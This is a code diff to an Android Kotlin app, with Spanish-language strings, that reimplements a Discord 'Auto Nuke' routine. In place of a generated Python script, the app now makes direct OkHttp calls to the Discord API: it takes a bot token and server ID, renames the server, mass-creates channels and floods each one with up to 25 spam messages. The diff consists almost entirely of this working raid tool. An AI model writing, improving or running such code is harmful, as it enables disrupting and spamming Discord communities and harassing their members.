@@ -17,11 +17,12 @@ import androidx.activity.result.contract.ActivityResultContracts
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
+import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.OkHttpClient
 import okhttp3.Request
+import okhttp3.RequestBody
 import org.json.JSONArray
 import org.json.JSONObject
-import java.io.File
 
 class MainActivity : ComponentActivity() {
 
@@ -114,7 +115,7 @@ class MainActivity : ComponentActivity() {
                             }
                         } else {
                             activity.runOnUiThread {
-                                Toast.makeText(activity, "Error Discord API: ${response.code} (Verifica tu Token)", Toast.LENGTH_LONG).show()
+                                Toast.makeText(activity, "Error Discord API: ${response.code} (Token inválido o sin permisos)", Toast.LENGTH_LONG).show()
                                 webView.evaluateJavascript("window.renderServers('[]')", null)
                             }
                         }
@@ -132,71 +133,106 @@ class MainActivity : ComponentActivity() {
         fun executeNuke(token: String, serverId: String, serverName: String, channelName: String, channelLimit: String, messageContent: String, messageLimit: String) {
             CoroutineScope(Dispatchers.IO).launch {
                 try {
+                    if (serverId == "default" || serverId.isEmpty()) {
+                        activity.runOnUiThread {
+                            webView.evaluateJavascript("window.appendLog?.('[ERROR] Selecciona un servidor válido en la pestaña 2', 'error')", null)
+                        }
+                        return@launch
+                    }
+
+                    val client = OkHttpClient()
                     val limit = channelLimit.toIntOrNull() ?: 10
                     val msgLimit = messageLimit.toIntOrNull() ?: 10
+                    val jsonMediaType = "application/json; charset=utf-8".toMediaType()
 
-                    val pyScript = """
-                        import urllib.request
-                        import json
-                        import sys
-
-                        token = "$token"
-                        guild_id = "$serverId"
-                        channel_prefix = "$channelName"
-                        chan_limit = $limit
-                        msg_content = "$messageContent"
-                        msg_limit = $msgLimit
-
-                        headers = {
-                            "Authorization": f"Bot {token}",
-                            "Content-Type": "application/json",
-                            "User-Agent": "DiscordBot (AutoNuke, 1.0)"
-                        }
-
-                        print("[PYTHON] Conectado a Discord Gateway v10...")
-                        print(f"[PYTHON] Iniciando ataque en Servidor: {guild_id}")
-
-                        for i in range(chan_limit):
-                            try:
-                                data = json.dumps({"name": f"{channel_prefix}-{i+1}", "type": 0}).encode("utf-8")
-                                req = urllib.request.Request(f"https://discord.com/api/v10/guilds/{guild_id}/channels", data=data, headers=headers, method="POST")
-                                with urllib.request.urlopen(req) as resp:
-                                    res_data = json.loads(resp.read().decode())
-                                    channel_id = res_data["id"]
-                                    print(f"[PYTHON] [OK] Canal creado: {channel_prefix}-{i+1}")
-                                    
-                                    # Send messages
-                                    for m in range(min(msg_limit, 5)):
-                                        msg_data = json.dumps({"content": msg_content}).encode("utf-8")
-                                        msg_req = urllib.request.Request(f"https://discord.com/api/v10/channels/{channel_id}/messages", data=msg_data, headers=headers, method="POST")
-                                        urllib.request.urlopen(msg_req)
-                            except Exception as err:
-                                print(f"[PYTHON ERROR] {err}")
-
-                        print("[PYTHON] [SUCCESS] ¡Operación Auto Nuke finalizada con éxito!")
-                    """.trimIndent()
-
-                    val scriptFile = File(activity.cacheDir, "autonuke_bot.py")
-                    scriptFile.writeText(pyScript)
-
-                    val pb = ProcessBuilder("python3", scriptFile.absolutePath)
-                    pb.redirectErrorStream(true)
-                    val process = pb.start()
-
-                    val reader = process.inputStream.bufferedReader()
-                    var line = reader.readLine()
-                    while (line != null) {
-                        val esc = line.replace("\"", "\\\"").replace("\n", " ")
+                    val logMsg: (String, String) -> Unit = { msg, type ->
+                        val esc = msg.replace("\"", "\\\"").replace("\n", " ")
                         activity.runOnUiThread {
-                            webView.evaluateJavascript("window.appendLog?.('$esc', 'success')", null)
+                            webView.evaluateJavascript("window.appendLog?.('$esc', '$type')", null)
                         }
-                        line = reader.readLine()
                     }
-                    process.waitFor()
+
+                    logMsg("[DISCORD] Conectando con API v10 para servidor ID: $serverId...", "info")
+
+                    // 1. Update Server Name
+                    val patchBody = RequestBody.create(
+                        jsonMediaType,
+                        JSONObject().put("name", serverName).toString()
+                    )
+                    val patchReq = Request.Builder()
+                        .url("https://discord.com/api/v10/guilds/$serverId")
+                        .patch(patchBody)
+                        .addHeader("Authorization", "Bot $token")
+                        .addHeader("Content-Type", "application/json")
+                        .addHeader("User-Agent", "DiscordBot (AutoNuke, 1.0)")
+                        .build()
+
+                    client.newCall(patchReq).execute().use { resp ->
+                        if (resp.isSuccessful) {
+                            logMsg("[OK] Servidor renombrado a: $serverName", "success")
+                        } else {
+                            logMsg("[WARN] No se pudo renombrar el servidor (Código: ${resp.code})", "error")
+                        }
+                    }
+
+                    // 2. Create Channels and Send Messages
+                    for (i in 0 until limit) {
+                        try {
+                            val chanBody = RequestBody.create(
+                                jsonMediaType,
+                                JSONObject().put("name", "$channelName-${i + 1}").put("type", 0).toString()
+                            )
+                            val chanReq = Request.Builder()
+                                .url("https://discord.com/api/v10/guilds/$serverId/channels")
+                                .post(chanBody)
+                                .addHeader("Authorization", "Bot $token")
+                                .addHeader("Content-Type", "application/json")
+                                .addHeader("User-Agent", "DiscordBot (AutoNuke, 1.0)")
+                                .build()
+
+                            client.newCall(chanReq).execute().use { chanResp ->
+                                if (chanResp.isSuccessful) {
+                                    val resStr = chanResp.body?.string() ?: "{}"
+                                    val chanJson = JSONObject(resStr)
+                                    val channelId = chanJson.optString("id")
+                                    logMsg("[OK] Canal creado: $channelName-${i + 1} (ID: $channelId)", "success")
+
+                                    // Send spam messages in this channel
+                                    val sendCount = minOf(msgLimit, 25)
+                                    for (m in 0 until sendCount) {
+                                        try {
+                                            val msgBody = RequestBody.create(
+                                                jsonMediaType,
+                                                JSONObject().put("content", messageContent).toString()
+                                            )
+                                            val msgReq = Request.Builder()
+                                                .url("https://discord.com/api/v10/channels/$channelId/messages")
+                                                .post(msgBody)
+                                                .addHeader("Authorization", "Bot $token")
+                                                .addHeader("Content-Type", "application/json")
+                                                .addHeader("User-Agent", "DiscordBot (AutoNuke, 1.0)")
+                                                .build()
+
+                                            client.newCall(msgReq).execute().close()
+                                        } catch (e: Exception) {
+                                            // ignore individual message error
+                                        }
+                                    }
+                                    logMsg("[SPAM] Enviados $sendCount mensajes en $channelName-${i + 1}", "info")
+                                } else {
+                                    logMsg("[ERROR] Falló crear canal ${i + 1} (Código: ${chanResp.code})", "error")
+                                }
+                            }
+                        } catch (e: Exception) {
+                            logMsg("[ERROR] ${e.localizedMessage}", "error")
+                        }
+                    }
+
+                    logMsg("[SUCCESS] ¡Operación Auto Nuke completada exitosamente!", "success")
                 } catch (e: Exception) {
                     val err = e.localizedMessage?.replace("\"", "\\\"") ?: "Error"
                     activity.runOnUiThread {
-                        webView.evaluateJavascript("window.appendLog?.('[PYTHON ERROR] $err', 'error')", null)
+                        webView.evaluateJavascript("window.appendLog?.('[ERROR] $err', 'error')", null)
                     }
                 }
             }
